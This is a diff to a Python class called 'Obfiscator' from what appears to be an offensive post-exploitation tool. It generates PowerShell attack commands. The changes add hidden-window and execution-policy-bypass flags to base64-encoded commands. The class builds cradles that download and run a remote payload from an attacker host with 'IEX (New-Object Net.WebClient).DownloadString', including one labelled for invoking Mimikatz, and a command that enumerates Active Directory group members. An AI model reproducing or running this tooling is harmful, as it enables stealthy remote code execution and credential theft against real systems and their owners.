@@ -79,8 +79,11 @@ class Obfiscator:
     def packager(self, cleartext):
         encoded_utf = cleartext.encode('utf-16-le')
         encoded_base64 = base64.b64encode(encoded_utf)
-        command = "powershell.exe -nop -enc %s" % (encoded_base64)
+        command = "powershell.exe -nop -w hidden -exec bypass -enc %s" % (encoded_base64)
         return(command)
+    
+    def clearer(self, cleartext):
+        command = 'powershell.exe -nop -w hidden -exec bypass"' + cleartext + '"'
 
     def return_command(self):
         try:
@@ -93,19 +96,19 @@ class Obfiscator:
         # Invoke Mimikatz Directly
         text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
-        self.unprotected_command = 'powershell "' + text +'"'
+        self.unprotected_command = self.clearer(text)
 
     def downloader(self):
         # Download String Directly
-        text = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
+        text = "IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
         self.command = self.packager(text)
-        self.unprotected_command = 'powershell "' + text +'"'
+        self.unprotected_command = self.clearer(text)
 
     def group_members(self):
         # Group Membership
         text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
         self.command = self.packager(text)
-        self.unprotected_command = 'powershell "' + text +'"'
+        self.unprotected_command = self.clearer(text)
 
 def get_interfaces():
     interfaces = netifaces.interfaces()
